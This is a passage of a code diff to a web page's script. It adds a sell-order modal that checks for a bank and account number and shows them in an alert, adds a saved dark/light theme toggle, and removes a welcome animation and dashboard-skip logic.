+      openModal('sellModal');
+      this.classList.add('active');
+      setTimeout(()=>this.classList.remove('active'), 600);
+    };
+    document.getElementById('sellProceedBtn').onclick = function() {
+      var bank = document.getElementById('bankSelect').value;
+      var acc = document.getElementById('accountNumberInput').value.trim();
+      var error = document.getElementById('sellErrorMsg');
+      if (!bank || !acc) {
+        error.textContent = "Please select your bank and enter account number.";
         error.style.display = "block";
-        error.textContent = "Please fill in all fields.";
-        return false;
+        return;
       }
       error.style.display = "none";
-      closeModal('modal2');
-      // Welcome Animation
-      let welcome = document.getElementById('welcomeAnim');
-      welcome.classList.add('active');
-      setTimeout(function() {
-        welcome.classList.remove('active');
-        document.getElementById('startScreen').style.display = "none";
-        document.getElementById('dashboardContainer').classList.add('dashboard-show');
-      }, 2000);
-      // Prevent repeat
-      localStorage.setItem('cb-welcome', '1');
-      return false;
+      alert('Sell Order Created!\nBank: '+bank+'\nAccount: '+acc+'\n(Continue implementing the full sell process as needed.)');
+      closeModal('sellModal');
     };
-    // If already verified, skip to dashboard
-    if (localStorage.getItem('cb-welcome')) {
-      document.getElementById('startScreen').style.display = "none";
-      document.getElementById('dashboardContainer').classList.add('dashboard-show');
-    }
+
+    // Dark/Light Mode Toggle
+    const toggleThemeBtn = document.getElementById('toggleThemeBtn');
+    toggleThemeBtn.addEventListener('click', function(){
+      document.body.classList.toggle('light');
+      toggleThemeBtn.classList.toggle('active');
+      localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+    // Load theme on startup
+    window.addEventListener('DOMContentLoaded', () => {
+      if(localStorage.getItem('theme') === 'light') {
+        document.body.classList.add('light');
+        toggleThemeBtn.classList.add('active');
+      }
+    });
   </script>
 </body>
 </html>
